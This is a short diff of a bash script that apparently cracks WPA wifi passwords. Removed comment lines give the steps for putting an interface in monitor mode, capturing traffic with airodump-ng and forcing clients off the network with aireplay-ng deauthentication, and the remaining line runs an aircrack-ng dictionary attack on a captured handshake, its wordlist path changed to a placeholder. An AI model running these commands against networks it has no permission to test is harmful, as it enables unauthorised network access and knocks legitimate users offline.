@@ -1,13 +1,4 @@
 #!/bin/bash\
-#https://louisabraham.github.io/articles/WPA-wifi-cracking-MBP.html
-# sur linux :
-# ifconfig wlx503eaad06c63 down
-# iwconfig wlx503eaad06c63 mode monitor
-# airodump-ng wlx503eaad06c63
-# airodump-ng -d MAC -c CHANNEL wlx503eaad06c63
-# aireplay-ng -0 0 -a MACbox -c MACclient wlx503eaad06c63
-
-
 
 BSSID=Default
 
@@ -45,4 +36,4 @@ rm handshake.cap
 
 resize -s 20 72
 
-aircrack-ng -w /Applications/WIFIHACK.app/Contents/Resources/Scripts/Top85Million-WPA-probable-v2.txt -b $BSSID capture.cap
+aircrack-ng -w HER_SET_YOUR_PATH -b $BSSID capture.cap
